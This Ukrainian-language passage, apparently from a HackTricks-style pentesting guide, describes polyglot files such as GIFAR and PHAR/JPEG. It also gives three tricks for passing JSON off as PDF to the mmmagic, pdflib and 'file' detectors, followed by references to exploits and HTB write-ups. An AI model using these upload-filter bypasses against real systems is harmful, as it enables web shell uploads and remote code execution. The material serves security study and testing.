Polyglot files слугують унікальним інструментом у кібербезпеці, виступаючи камуфляжем, який може одночасно коректно існувати в кількох форматах файлів. Цікавим прикладом є [GIFAR](https://en.wikipedia.org/wiki/Gifar) — гібрид, що функціонує як GIF і як RAR-архів. Такі файли не обмежуються цим поєднанням; можливі й комбінації на кшталт GIF та JS або PPT та JS.

Основна користь polyglot files полягає в їхній здатності обходити заходи безпеки, які фільтрують файли за типом. Звично в різних додатках дозволяють завантаження лише певних типів файлів — наприклад, JPEG, GIF або DOC — щоб зменшити ризик шкідливих форматів (наприклад, JS, PHP або Phar). Однак polyglot, відповідаючи структурним критеріям кількох форматів одночасно, може таємно обійти ці обмеження.

Незважаючи на адаптивність, polyglots мають обмеження. Наприклад, хоч polyglot може одночасно бути PHAR-файлом (PHp ARchive) та JPEG, успіх його завантаження може залежати від політики платформи щодо розширень файлів. Якщо система суворо контролює дозволені розширення, сама структурна двоїстість polyglot може бути недостатньою для гарантії завантаження.

Докладніше: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Як уникнути визначення типу файлу, завантаживши дійсний JSON навіть якщо це не дозволено, підробивши PDF-файл (техніки з **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Поки магічні байти `%PDF` знаходяться в перших 1024 байтах, файл вважається дійсним (див. приклад у пості)
- **`pdflib` library**: Додайте фейковий PDF всередину поля JSON, щоб бібліотека вважала його pdf (див. приклад у пості)
- **`file` binary**: Він може прочитати до 1048576 байт з файлу. Просто створіть JSON більший за цей розмір, щоб він не міг розпарсити вміст як JSON, а потім всередині JSON помістіть початкову частину реального PDF — і він вважатиме це PDF

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [0xdf – HTB: Certificate (ZIP NUL-name and stacked ZIP parser confusion → PHP RCE)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
